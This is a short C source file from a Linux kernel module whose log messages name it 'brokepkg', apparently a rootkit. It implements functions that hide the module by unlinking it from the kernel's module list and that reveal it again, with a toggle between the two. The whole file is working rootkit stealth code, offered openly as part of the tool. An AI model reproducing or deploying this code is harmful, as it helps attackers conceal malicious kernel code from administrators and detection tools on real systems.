#include <linux/init.h>
// header
#include <linux/kallsyms.h>
#include <linux/module.h>

#include "config.h"
#include "utils.h"

static struct list_head *prev_module;
static short isHidden = 0;

void module_show(void) {
  list_add(&THIS_MODULE->list, prev_module);
  isHidden = 0;
  PR_INFO("brokepkg: module revealed");
}

void module_hide(void) {
  prev_module = THIS_MODULE->list.prev;
  list_del(&THIS_MODULE->list);
  isHidden = 1;
  PR_INFO("brokepkg: hidden module");
}

void switch_module_hide(void) {
  if (isHidden)
    module_show();
  else
    module_hide();
}
